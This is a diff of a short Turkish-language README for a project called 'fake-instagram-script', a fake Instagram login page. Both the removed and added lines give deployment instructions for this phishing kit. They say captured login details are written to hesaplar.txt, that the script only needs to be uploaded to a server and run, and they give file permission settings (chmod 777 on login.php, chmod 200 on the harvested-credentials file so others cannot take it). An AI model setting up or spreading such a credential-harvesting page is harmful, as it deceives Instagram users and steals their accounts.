@@ -1,6 +1,4 @@
 # fake-instagram-script
 fake instagram login page
 
-Giriş bilgileri hesaplar.txt ye kayıt olmaktadır. 
-sunucuya atıp direk kullanabilirsiniz.
-hesaplar.txt ye yazma izni vermeyi unutmayın.
+script kullanımı basit olup at çalıştır sistemdir. login.php de chmod 777 olmalıdır. veriler hesaplar.txt ye aktarılır. hesaplar.txt çalınmaya karşın chmod 200 olmalıdır.
